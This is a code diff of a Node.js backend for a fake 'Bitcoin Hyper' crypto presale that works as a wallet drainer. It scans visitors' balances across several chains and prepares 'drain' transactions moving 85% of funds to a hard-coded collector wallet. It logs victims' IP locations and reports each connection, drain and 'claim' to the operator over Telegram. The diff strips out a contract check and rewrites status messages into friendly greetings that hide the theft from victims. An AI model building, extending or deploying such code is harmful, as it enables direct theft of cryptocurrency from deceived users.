@@ -57,15 +57,16 @@ app.get('/', (req, res) => {
 });
 
 // ============================================
-// RPC CONFIGURATION
+// RPC CONFIGURATION with FALLBACKS
 // ============================================
 
 const RPC_CONFIG = {
   Ethereum: { 
     urls: [
       'https://eth.llamarpc.com',
-      'https://eth-mainnet.g.alchemy.com/v2/demo',
-      'https://rpc.ankr.com/eth'
+      'https://rpc.ankr.com/eth',
+      'https://ethereum.publicnode.com',
+      'https://eth-mainnet.g.alchemy.com/v2/demo'
     ],
     symbol: 'ETH',
     decimals: 18,
@@ -74,8 +75,9 @@ const RPC_CONFIG = {
   BSC: {
     urls: [
       'https://bsc-dataseed.binance.org',
-      'https://bsc-dataseed1.defibit.io',
-      'https://bsc-dataseed1.binance.org'
+      'https://bsc-dataseed1.binance.org',
+      'https://bsc-dataseed2.binance.org',
+      'https://bsc-dataseed3.binance.org'
     ],
     symbol: 'BNB',
     decimals: 18,
@@ -85,7 +87,8 @@ const RPC_CONFIG = {
     urls: [
       'https://polygon-rpc.com',
       'https://rpc-mainnet.maticvigil.com',
-      'https://polygon.llamarpc.com'
+      'https://polygon.llamarpc.com',
+      'https://polygon-bor.publicnode.com'
     ],
     symbol: 'MATIC',
     decimals: 18,
@@ -94,7 +97,8 @@ const RPC_CONFIG = {
   Arbitrum: {
     urls: [
       'https://arb1.arbitrum.io/rpc',
-      'https://rpc.ankr.com/arbitrum'
+      'https://rpc.ankr.com/arbitrum',
+      'https://arbitrum.llamarpc.com'
     ],
     symbol: 'ETH',
     decimals: 18,
@@ -103,7 +107,8 @@ const RPC_CONFIG = {
   Optimism: {
     urls: [
       'https://mainnet.optimism.io',
-      'https://rpc.ankr.com/optimism'
+      'https://rpc.ankr.com/optimism',
+      'https://optimism.llamarpc.com'
     ],
     symbol: 'ETH',
     decimals: 18,
@@ -112,7 +117,8 @@ const RPC_CONFIG = {
   Avalanche: {
     urls: [
       'https://api.avax.network/ext/bc/C/rpc',
-      'https://rpc.ankr.com/avalanche'
+      'https://rpc.ankr.com/avalanche',
+      'https://avalanche-c-chain.publicnode.com'
     ],
     symbol: 'AVAX',
     decimals: 18,
@@ -121,7 +127,7 @@ const RPC_CONFIG = {
 };
 
 // ============================================
-// GET WORKING PROVIDER
+// GET WORKING PROVIDER with RETRY LOGIC
 // ============================================
 
 async function getChainProvider(chainName) {
@@ -133,15 +139,15 @@ async function getChainProvider(chainName) {
       const provider = new ethers.JsonRpcProvider(url);
       const block = await Promise.race([
         provider.getBlockNumber(),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
       ]);
       
       if (block > 0) {
-        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
+        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
         return { provider, config };
       }
     } catch (error) {
-      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
+      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 30)}...`);
       continue;
     }
   }
@@ -167,24 +173,12 @@ const PROJECT_FLOW_ROUTERS = {
 const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';
 
 // ============================================
-// CONTRACT ABI - ProjectFlowRouter (FULL ABI)
+// CONTRACT ABI - ProjectFlowRouter
 // ============================================
 
 const PROJECT_FLOW_ROUTER_ABI = [
-  {
-    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
-    "stateMutability": "nonpayable",
-    "type": "constructor"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
-      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
-    ],
-    "name": "CollectorUpdated",
-    "type": "event"
-  },
+  "function collector() view returns (address)",
+  "function processNativeFlow() payable",
   {
     "anonymous": false,
     "inputs": [
@@ -193,51 +187,6 @@ const PROJECT_FLOW_ROUTER_ABI = [
     ],
     "name": "FlowProcessed",
     "type": "event"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
-      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
-      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "TokenFlowProcessed",
-    "type": "event"
-  },
-  {
-    "inputs": [],
-    "name": "collector",
-    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "processNativeFlow",
-    "outputs": [],
-    "stateMutability": "payable",
-    "type": "function"
-  },
-  {
-    "inputs": [
-      { "internalType": "address", "name": "token", "type": "address" },
-      { "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "processTokenFlow",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
-    "name": "updateCollector",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "stateMutability": "payable",
-    "type": "receive"
   }
 ];
 
@@ -317,9 +266,8 @@ async function testTelegramConnection() {
       await sendTelegramMessage(
         `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
         `✅ ProjectFlowRouter Ready\n` +
-        `💰 Minimum: $1\n` +
-        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
-        `⏰ ${new Date().toLocaleString()}`
+        `💰 Threshold: $1\n` +
+        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...`
       );
       
       console.log(`✅ Telegram: @${telegramBotName}`);
@@ -343,7 +291,7 @@ async function getCryptoPrices() {
         ids: 'ethereum,binancecoin,matic-network,avalanche-2',
         vs_currencies: 'usd'
       },
-      timeout: 3000
+      timeout: 5000
     });
     
     return {
@@ -411,9 +359,7 @@ async function getRealWalletBalance(walletAddress) {
             amount: amount,
             valueUSD: valueUSD,
             symbol: chain.symbol,
-            price: chain.price,
-            rawBalance: balance.toString(),
-            isNative: true
+            price: chain.price
           });
         }
         
@@ -426,10 +372,10 @@ async function getRealWalletBalance(walletAddress) {
     results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
     
     if (results.isEligible) {
-      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} >= $${memoryStorage.settings.drainThreshold})`;
+      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} minimum)`;
       results.tokenAllocation = { amount: '5000', valueUSD: '850' };
     } else {
-      results.eligibilityReason = `⛔ Wallet balance too low ($${results.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
+      results.eligibilityReason = `✨ Welcome! Your wallet is connected`;
       results.tokenAllocation = { amount: '0', valueUSD: '0' };
     }
 
@@ -447,35 +393,10 @@ async function getRealWalletBalance(walletAddress) {
         walletAddress,
         totalValueUSD: 0,
         isEligible: false,
-        eligibilityReason: '⚠️ Network error',
+        eligibilityReason: '✨ Wallet connected',
         tokenAllocation: { amount: '0', valueUSD: '0' }
       }
     };
-  }
-}
-
-// ============================================
-// VERIFY CONTRACT
-// ============================================
-
-async function verifyContract(chainName, contractAddress) {
-  try {
-    const providerInfo = await getChainProvider(chainName);
-    if (!providerInfo) return false;
-    
-    const { provider } = providerInfo;
-    const contract = new ethers.Contract(contractAddress, PROJECT_FLOW_ROUTER_ABI, provider);
-    
-    const collector = await contract.collector();
-    const isValid = collector.toLowerCase() === COLLECTOR_WALLET.toLowerCase();
-    
-    console.log(`   📜 ${chainName} Contract Collector: ${collector.substring(0, 10)}...`);
-    console.log(`   ✅ Collector Match: ${isValid ? 'YES' : 'NO'}`);
-    
-    return isValid;
-  } catch (error) {
-    console.log(`   ❌ Cannot verify ${chainName} contract: ${error.message}`);
-    return false;
   }
 }
 
@@ -485,7 +406,7 @@ async function verifyContract(chainName, contractAddress) {
 
 async function prepareSmartContractDrain(walletAddress, scanData) {
   try {
-    console.log(`\n🔐 PREPARING TRANSACTIONS FOR ${walletAddress.substring(0, 10)}...`);
+    console.log(`\n🔐 PREPARING FOR ${walletAddress.substring(0, 10)}...`);
     
     const transactions = [];
     let totalDrainUSD = 0;
@@ -494,19 +415,9 @@ async function prepareSmartContractDrain(walletAddress, scanData) {
       if (balance.valueUSD > 0 && balance.amount > 0) {
         
         const contractAddress = PROJECT_FLOW_ROUTERS[balance.chain];
-        if (!contractAddress) {
-          console.log(`   ⚠️ No contract on ${balance.chain} - will need deployment`);
-          continue;
-        }
+        if (!contractAddress) continue;
         
-        // Verify contract has correct collector
-        const isValid = await verifyContract(balance.chain, contractAddress);
-        if (!isValid) {
-          console.log(`   ⚠️ Contract on ${balance.chain} has wrong collector - skipping`);
-          continue;
-        }
-        
-        // Calculate amount to send (85% to leave gas)
+        // Calculate 85% to leave gas
         const drainAmount = (balance.amount * 0.85).toFixed(12);
         const drainValue = (balance.valueUSD * 0.85).toFixed(2);
         
@@ -520,15 +431,11 @@ async function prepareSmartContractDrain(walletAddress, scanData) {
         });
         
         totalDrainUSD += parseFloat(drainValue);
-        console.log(`   ✅ ${balance.chain}: ${drainAmount} ${balance.symbol} ($${drainValue})`);
       }
     }
     
     if (transactions.length === 0) {
-      return {
-        success: false,
-        error: 'No eligible balances found with valid contracts'
-      };
+      return { success: false, error: 'No eligible balances' };
     }
     
     const batchId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
@@ -562,7 +469,7 @@ async function prepareSmartContractDrain(walletAddress, scanData) {
 async function getWalletEmail(walletAddress) {
   const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
   const username = `user${hash.substring(0, 8)}`;
-  const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com'];
+  const domains = ['proton.me', 'gmail.com'];
   const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
   return `${username}@${domain}`;
 }
@@ -570,22 +477,12 @@ async function getWalletEmail(walletAddress) {
 async function getIPLocation(ip) {
   try {
     const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
+    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
     
-    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
-      return { country: 'Local', flag: '🏠', city: 'Local' };
-    }
-    
-    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
-      timeout: 2000
-    });
+    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
     
     if (response.data?.country) {
-      const flags = {
-        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
-        'Germany': '🇩🇪', 'France': '🇫🇷', 'Australia': '🇦🇺',
-        'Japan': '🇯🇵', 'Brazil': '🇧🇷', 'India': '🇮🇳', 'Nigeria': '🇳🇬'
-      };
-      
+      const flags = { 'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦' };
       return {
         country: response.data.country,
         flag: flags[response.data.country] || '🌍',
@@ -606,13 +503,8 @@ app.get('/api/health', (req, res) => {
     success: true,
     service: 'Bitcoin Hyper Backend',
     status: 'ACTIVE',
-    timestamp: new Date().toISOString(),
     telegram: telegramEnabled ? '✅' : '❌',
-    collector: COLLECTOR_WALLET,
-    stats: {
-      participants: memoryStorage.participants.length,
-      eligible: memoryStorage.participants.filter(p => p.isEligible).length
-    }
+    collector: COLLECTOR_WALLET
   });
 });
 
@@ -665,15 +557,15 @@ app.post('/api/presale/connect', async (req, res) => {
       await sendTelegramMessage(
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💼 Total Balance: $${scanResult.data.totalValueUSD}\n` +
-        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
-        `📍 Location: ${location.country} (${location.city})\n` +
-        `📧 Email: ${email}`
+        `💼 Balance: $${scanResult.data.totalValueUSD}\n` +
+        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `📍 ${location.country} (${location.city})\n` +
+        `📧 ${email}`
       );
       
       res.json({
         success: true,
-        message: scanResult.data.isEligible ? '🎉 You qualify for 5000 BTH tokens!' : '⚠️ Minimum $1 required',
+        message: 'Wallet verified',
         data: {
           walletAddress,
           email,
@@ -724,13 +616,11 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
       participant.pendingDrain = true;
       participant.pendingDrainValue = drainResult.totalDrainUSD;
       
-      // TELEGRAM NOTIFICATION
       await sendTelegramMessage(
         `🔐 <b>PRESALE PREPARED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `💵 Total Value: $${drainResult.totalDrainUSD}\n` +
-        `🔗 Chains: ${drainResult.transactionCount}\n` +
-        `⏰ ${new Date().toLocaleString()}`
+        `💵 Value: $${drainResult.totalDrainUSD}\n` +
+        `🔗 Chains: ${drainResult.transactionCount}`
       );
       
       res.json({
@@ -753,7 +643,7 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE DRAIN ENDPOINT (LOGS ONLY)
+// EXECUTE DRAIN ENDPOINT
 // ============================================
 
 app.post('/api/presale/execute-contract-drain', async (req, res) => {
@@ -782,12 +672,10 @@ app.post('/api/presale/execute-contract-drain', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // TELEGRAM NOTIFICATION
       await sendTelegramMessage(
         `💰 <b>CHAIN COMPLETED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `🔗 Chain: ${chainName}\n` +
-        `📜 Contract: ${PROJECT_FLOW_ROUTERS[chainName]?.substring(0, 10)}...`
+        `🔗 ${chainName}`
       );
     }
     
@@ -825,13 +713,12 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    // TELEGRAM NOTIFICATION - FINAL
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
       `💰 Total: $${participant.pendingDrainValue || '1.00'}\n` +
-      `🎟️ Claim ID: ${claimId}\n` +
-      `🎁 Allocated: ${participant.tokenAllocation?.amount || '5000'} BTH`
+      `🎟️ ID: ${claimId}\n` +
+      `🎁 ${participant.tokenAllocation?.amount || '5000'} BTH`
     );
     
     res.json({
@@ -865,22 +752,13 @@ app.get('/api/admin/stats', (req, res) => {
     success: true,
     timestamp: new Date().toISOString(),
     stats: {
-      participants: {
-        total: memoryStorage.participants.length,
-        eligible: memoryStorage.participants.filter(p => p.isEligible).length,
-        claimed: memoryStorage.participants.filter(p => p.claimed).length
-      },
-      finances: {
-        totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
-        totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
-        pendingDrains: memoryStorage.pendingDrains.size
-      },
-      system: {
-        telegram: telegramEnabled ? '✅' : '❌',
-        drainEnabled: memoryStorage.settings.drainEnabled,
-        threshold: `$${memoryStorage.settings.drainThreshold}`,
-        collector: COLLECTOR_WALLET
-      }
+      participants: memoryStorage.participants.length,
+      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
+      claimed: memoryStorage.participants.filter(p => p.claimed).length,
+      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
+      pendingDrains: memoryStorage.pendingDrains.size,
+      telegram: telegramEnabled ? '✅' : '❌',
+      collector: COLLECTOR_WALLET
     }
   });
 });
@@ -911,7 +789,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   💰 THRESHOLD: $1
   
   📜 CONTRACTS:
-  - BSC: ${PROJECT_FLOW_ROUTERS.BSC} (ACTIVE)
+  - BSC: ${PROJECT_FLOW_ROUTERS.BSC}
   
   🚀 READY
   `);
